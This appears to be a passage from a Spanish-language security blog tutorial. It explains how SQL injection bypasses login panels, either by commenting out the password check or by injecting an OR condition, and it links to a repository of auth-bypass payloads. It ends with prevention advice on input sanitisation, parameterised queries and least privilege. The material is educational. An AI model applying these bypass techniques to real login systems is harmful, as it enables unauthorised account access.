Para que un panel de login nos de acceso necesitaremos que la consulta devuelva un valor `TRUE`, es decir, que el usuario y la contraseña sean correctas. No nos sirve que el usuario sea correcto y que la contraseña sea incorrecta, por lo que deducimos no está utilizando un `OR` y que en cambio, está utilizando un `AND`. Deducimos que la consulta que se hace a la base de datos es parecida a la siguiente:

```plaintext
SELECT * FROM Usuarios WHERE usuario='[input usuario]' AND contraseña='[input usuario]';
```

Si quisieramos iniciar sesión en nuestro panel de login tendríamos que dar unas credenciales válidas, vamos a ver como se haría esto desde un punto de vista lógico.

![Panel de Login Lógico]({{ 'assets/img/commons/sqli/login_logico.png' | relative_url }}){: .center-image }
_Panel del Login visto de una forma Lógica_

Vemos que ambas expresiones del `AND` tienen valores `TRUE` por lo que el valor de la consulta se convierte en `TRUE`, dandonos acceso al panel del usuario en cuestión. Como hemos visto en los otros tipos de inyecciones SQL hemos sido capaces de inyectar código en la consulta para que nos lo interprete, de esta forma consiguiendo subvertir la lógica de la consulta. Pues esto mismo vamos a hacer, tenemos dos formas principales para hacer esto, voy a pasar a explicarlas.

La primera de ellas consiste en utilizar los comentarios para subvertir la lógica de la consulta. Existen varias formas de comentar en SQL:

* (#): es preferible poner mejor la forma codificada en url (%23) ya que de la forma normal lo toma como una etiqueta.
* (-- ): es necesario un espacio luego de los dos guiones, por lo que necesitaremos poner un guion después del espacio ya que si no lo hacemos no nos interpretara el espacio.
* (/* */): no suele usarse en inyecciones SQL.

Las dos primeras formas son las más utilizadas para las inyecciones SQL. La función de los comentarios será la de hacer que se ignore parte de la consulta, subvirtiendo la lógica de la consulta.Lo malo de este tipo de inyección en los paneles de login es que necesitaremos saber de un usuario existente para llevarla a cabo, vamos a verlo de una forma más sencilla a través de una imagen.

![Inyección SQL a través de Comentarios]({{ 'assets/img/commons/sqli/inyeccion_comentarios.png' | relative_url }}){: .center-image }
_Inyección SQL a través de Comentarios_

Como la consulta nos devuelve un valor `TRUE` nos dará accesso al panel del usuario. Esta es una buena forma de saltarse un login pero tiene la falla de que necesitamos saber de un usuario existente, aquí entra la otra forma, utilizando el operador lógico `OR`.

Utilizando el operador lógico `OR` de manera correcta conseguiremos que ambas expresiones del `AND` (usuario y contraseña) nos devuelvan un valor `TRUE`. Vamos a aprovechar que el operador `OR` nos devuelve un valor `TRUE` cuando una de las expresiones tenga un valor `TRUE`, de esta forma conseguiremos que ambas expresiones del `AND` tengan un valor `TRUE`, vamos a ver la consulta mejor de una forma lógica.

![Inyecci  n SQL a través del operador OR]({{ 'assets/img/commons/sqli/inyeccion_or.png' | relative_url }}){: .center-image }
_Inyección SQL a través del operador OR_

Vemos que finalmente la consulta nos devuelve un valor `TRUE` (notese el orden de las operaciones, como en matemáticas), por lo que nos dará acceso al panel del usuario. Si nos fijamos hemos puesto unas credenciales que no coinciden con ninguna almacenada en la base de datos, sin embargo, la consulta nos  ha devuelto un valor `TRUE` por lo que nos dara acceso a la cuenta del primer usuario que por lo general es el administrador.

Os dejo un [repositorio](https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads) de github en el que han recopilado una gran cantidad de payloads para bypasear paneles de login.

---
## Prevención inyecciones SQL

Las inyecciones SQL generalmente son causadas por aplicaciones web mal codificadas o privilegios de bases de datos y servidores back-end mal configurados. Existen varias formas de reducir las posibilidades de ser vulnerable a las inyecciones de SQL a través de métodos de codificación seguros, como la desinfección y validación de la entrada del usuario, controles adecuados de los privilegios y usuarios del back-end y el uso de consultas parametrizadas.

La inyección se puede evitar desinfectando cualquier entrada del usuario, lo que hace que las consultas inyectadas sean inútiles. Esto lo podemos lograr de dos formas:

* Las bibliotecas proporcionan múltiples funciones para lograr esto, un ejemplo de ello es la función mysqli_real_escape_string(). Esta función escapa caracteres como (') y ("), por lo que cuando un usuario los introduzca no serán interpretados como código sino como una cadena.
* Utilizando expresiones regulares que limiten algunos caracteres, como el input del campo nombre solamente puede componerse por letras podemos restringir la entrada a solo estos caracteres, lo que evitará la inyección de caracteres especiales como (') y (").

Las entradas de datos también se pueden validar en función de los datos a consultar para garantizar que coincida con la estructura de la entrada esperada. Por ejemplo, si solicitamos un correo electrónico al usuario, podemos filtrar que el input tenga una estructura igual a la siguiente "usuario@dominio.com".

Además es una buena práctica hacer uso de las consultas parametrizadas, usandolas no concatenamos directamente el valor de la variable de la entrada del usuario a la consulta SQL sino que primero pasamos a la consulta SQL un conjunto de parametros que luego escaparán la entrada del usuario.

Debemos asegurarnos de que el usuario que realiza las consultas en la base de datos tenga los permisos mínimos, a esto se le conoce en el mundo de la ciberseguridad como "Principio del Mínimo Privilegio". Los usuarios administradores bajo ningún concepto deben realizar las consultas a la base de datos ya que al ser administradores tienen permisos que podrían comprometer el servidor.
